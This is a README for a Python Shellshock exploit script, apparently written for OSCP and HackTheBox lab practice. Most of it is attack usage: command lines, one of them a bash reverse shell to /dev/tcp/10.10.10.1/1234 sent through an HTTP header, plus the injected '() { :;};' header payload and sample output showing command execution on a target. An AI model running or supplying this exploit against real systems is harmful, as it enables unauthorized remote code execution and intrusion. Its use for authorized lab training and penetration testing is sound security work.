# shellshock
Python3 Shellshock exploit script made for OSCP and HTB. Created this because I could not figure out how to make the nmap HTTP-shellshock.nse script do what I wanted.

## Usage
1. Run the script with python3
  - python3 shellshock.py -h
  - python3 shellshock.py target -p port -u 'uri'
  - python3 shellshock.py 127.0.0.1 -p 8081 -u '/cgi-bin/something' -c 'bash -c "id"' --verbose -H 'Referer'
  - python3 shellshock.py 1.1.1.1 -p 10000 -u '/' --command 'bash -i >& /dev/tcp/10.10.10.1/1234 0>&1' --header 'User-Agent' --proto https
2. Works best when sending request through Burp. Set up a proxy listener and forward the script requests to the host. Intercept request and modify as necessary. 

## Example
```sh
python3 shellshock.py 127.0.0.1 -p 8081 -u '/cgi-bin/user.sh' -c '/bin/bash -c "id"' -v

Target set to = 127.0.0.1
 Port set to = 8081
 URI set to = /cgi-bin/user.sh
 Command set to = /bin/bash -c "id"
 Header set to = ['User-Agent', 'Cookie', 'Referer']
 Protocol set to = http

Sending request with details:
    URI = http://127.0.0.1:8081/cgi-bin/user.sh
    Header for this request= {'User-Agent': '() { :;}; echo; /bin/bash -c "id"'}
    verify=False
Request sent. 
Done.
Status code returned = 200
uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```
